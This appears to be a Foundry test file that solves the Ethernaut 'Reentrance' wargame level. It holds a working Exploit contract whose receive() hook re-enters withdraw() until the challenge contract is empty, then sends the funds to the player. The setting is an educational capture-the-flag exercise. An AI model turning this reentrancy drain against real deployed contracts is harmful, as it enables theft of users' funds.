// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {console, Test} from "forge-std/Test.sol";
import {Reentrance} from "../../src/10/Reentrance.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {ReentranceFactory} from "src/10/ReentranceFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {BaseTest} from "../BaseTest.sol";
import {Vm} from "forge-std/Vm.sol";

contract ReentranceTest is Test, BaseTest {
    Reentrance public instanceContract;

    constructor() {
        // SETUP LEVEL FACTORY
        bytes memory bytecode = abi.encodePacked(vm.getCode("ReentranceFactory.sol"));
        assembly {
            sstore(levelFactory.slot, create(0, add(bytecode, 0x20), mload(bytecode)))
        }
        // levelFactory = address(new ReentranceFactory());
        vm.deal(owner, 1 ether);
        vm.deal(player, 2 ether);
    }

    function setUp() public override {
        super.setUp();

        instanceContract = Reentrance(instance);
        emit log_named_uint("balance", address(instanceContract).balance);
    }

    function testBalanceOfInstanceIsMoreThan0() public view {
        assert(address(instanceContract).balance > 0);
    }

    function testRunLevel() public {
        runLevel();
    }

    function exploitLevel() internal override {
        vm.startPrank(player);

        uint256 balance = address(instanceContract).balance;
        uint256 initialDonation = 0.1 ether;

        Exploit exploit = new Exploit{value: initialDonation}(instanceContract);
        uint256 playerBalance = player.balance;
        exploit.attack();

        exploit.withdrawToOwner();

        assert(address(instanceContract).balance == 0);
        assert(player.balance == balance + initialDonation + playerBalance);

        vm.stopPrank();
    }
}

contract Exploit {
    Reentrance instance;
    uint256 value;
    address owner;

    constructor(Reentrance _instance) payable {
        instance = _instance;
        value = msg.value;
        owner = msg.sender;
    }

    function attack() external {
        instance.donate{value: value}(address(this));
        instance.withdraw(value);
    }

    function withdrawToOwner() external {
        (bool success,) = owner.call{value: address(this).balance}("");
        require(success, "Call failed");
    }

    receive() external payable {
        if (address(instance).balance > 0) {
            uint256 withdrawAmount = msg.value;
            if (withdrawAmount > address(instance).balance) {
                withdrawAmount = address(instance).balance;
            }
            instance.withdraw(withdrawAmount);
        }
    }
}
